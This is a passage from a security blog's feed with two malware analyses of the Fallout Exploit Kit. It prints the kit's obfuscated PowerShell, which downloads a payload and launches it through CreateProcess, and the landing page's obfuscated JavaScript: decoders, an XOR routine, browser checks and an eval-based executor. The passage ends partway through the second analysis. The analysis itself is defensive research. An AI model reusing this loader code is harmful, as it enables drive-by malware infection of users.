</span><span class="nv">$cli</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$I1l11I1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">lI1ll1Il1I1l</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IlII1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IIIlI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$I1I1l1IIllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$IIl1Il1I</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">I1lII1Il1</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">l1Il11III</span><span class="p">]::</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00000008</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="s2">"c:"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$I1I1l1IIllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$IIl1Il1I</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">out-null</span><span class="p">;</span><span class="w">
</span></code></pre></div></div>

<p>Thus the malware is downloaded and executed.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Fallout has been heavily updated, making analysis very difficult. Very sophisticated techniques such as Diffie-Hellman key exchange, VM detection, process detection, etc. are used. We need to be careful as they may be updated in the future.</p>
]]></content:encoded>
<pubDate>2019-07-09T15:00:00+00:00</pubDate>
</item>
<item>
<title>Analysis of Fallout Exploit Kit v3</title>
<link>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</link>
<guid>http://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We already tweeted, but the Fallout Exploit Kit has been updated. In the new Fallout, the traffic chain, obfuscation method of landing page and shellcode are changing. We will introduce details on the changes using <a href="http://malware-traffic-analysis.net/2019/02/28/index.html">Malware-Traffic-Analysis.net’s saz file</a>.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">New <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a> is using PoC on GitHub!<br />(CC: <a href="https://twitter.com/kafeine?ref_src=twsrc%5Etfw">@kafeine</a>, <a href="https://twitter.com/jeromesegura?ref_src=twsrc%5Etfw">@jeromesegura</a>, <a href="https://twitter.com/malware_traffic?ref_src=twsrc%5Etfw">@malware_traffic</a>)<a href="https://t.co/L1J5QOwJWn">https://t.co/L1J5QOwJWn</a><a href="https://t.co/ehhwtQqC5j">https://t.co/ehhwtQqC5j</a><a href="https://t.co/7opIhvSxg4">https://t.co/7opIhvSxg4</a> <a href="https://t.co/sJ1ESYpxbv">pic.twitter.com/sJ1ESYpxbv</a></p>&mdash; nao_sec (@nao_sec) <a href="https://twitter.com/nao_sec/status/1100931219242442752?ref_src=twsrc%5Etfw">2019年2月28日</a></blockquote>


<h2 id="traffic">Traffic</h2>
<p>As usual HookAds Campaign will reach the landing page of Fallout and the attack will start. The flow of traffic is like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<h2 id="landing-page">Landing Page</h2>
<p>Let’s read the JavaScript on the landing page. Firstly, the objects necessary for decoding are defined.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">OygitP9</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">fZ2S0q</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">cMa5g</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span><span class="p">,</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">p2Z2Fkoy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">P1mnrrMi834</span><span class="p">(</span><span class="nx">MQVCd</span><span class="p">);</span> <span class="nx">p2Z2Fkoy</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">b8j5WMF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">negriNm4A3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">p2Z2Fkoy</span><span class="o">++</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">negriNm4A3</span><span class="p">)</span> <span class="p">?</span> <span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span> <span class="p">:</span> <span class="nb">isNaN</span><span class="p">(</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">=</span> <span class="mi">64</span><span class="p">),</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">m3Z1Kc</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">T82SkC</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">OcKyWsdOFyq</span>
    <span class="p">},</span>
    <span class="na">jbRyz</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">b8j5WMF</span><span class="p">,</span> <span class="nx">negriNm4A3</span><span class="p">,</span> <span class="nx">ir4N7w</span><span class="p">,</span> <span class="nx">W3cN0hF2WFu</span><span class="p">,</span> <span class="nx">qT8fpZ1</span><span class="p">,</span> <span class="nx">m3Z1Kc</span><span class="p">,</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">OcKyWsdOFyq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">[^</span><span class="sr">A-Za-z0-9</span><span class="se">\+\/\=]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span> <span class="nx">OcKyWsdOFyq</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="p">(</span><span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))),</span> <span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">b8j5WMF</span><span class="p">),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">qT8fpZ1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">)),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">m3Z1Kc</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">));</span>
        <span class="k">return</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">quSjT4yyl</span><span class="p">(</span><span class="nx">T82SkC</span><span class="p">)</span>
    <span class="p">},</span>
    <span class="na">P1mnrrMi834</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">\r\n</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">);</span>
            <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="mi">127</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">2048</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">192</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">224</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">63</span> <span class="o">|</span> <span class="mi">128</span><span class="p">)),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span> <span class="o">|</span> <span class="mi">128</span><span class="p">))</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">},</span>
    <span class="na">quSjT4yyl</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">UK1Az5</span> <span class="o">=</span> <span class="nx">zxh4w4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">),</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">:</span> <span class="mi">191</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">224</span> <span class="p">?</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">31</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">c3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="p">(</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">c3</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next defined object is also for decoding.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">DwQ5oeN9ct</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">hxk4VZ3L8GC</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="nx">DwQ5oeN9ct</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">UsEJ64xf0P</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">D8H6A7MGHf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">D8H6A7MGHf</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">D8H6A7MGHf</span><span class="o">++</span><span class="p">,</span> <span class="nx">r5UpGh</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">r5UpGh</span> <span class="o">===</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nx">UsEJ64xf0P</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">D8H6A7MGHf</span><span class="p">)</span> <span class="o">^</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">r5UpGh</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">UsEJ64xf0P</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next object, make sure that it is not in Chrome and Opera using, for example, User-Agent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">BITU978SF7</span> <span class="o">=</span> <span class="p">((</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addons</span><span class="dl">'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opera</span><span class="dl">'</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">'</span><span class="s1">userAgent</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1"> OPR/</span><span class="dl">'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">InstallTrigger</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">documentMode</span><span class="dl">'</span><span class="p">])</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">runtime</span><span class="dl">'</span><span class="p">]);</span>
    <span class="k">return</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">cMa5g</span><span class="dl">'</span><span class="p">](</span><span class="nx">BITU978SF7</span><span class="p">[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The next object is for executing code. This is the most important object.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">eval</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">]());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>With these codes, the following code will be executed. This downloads the encoded data and executes it.</p>

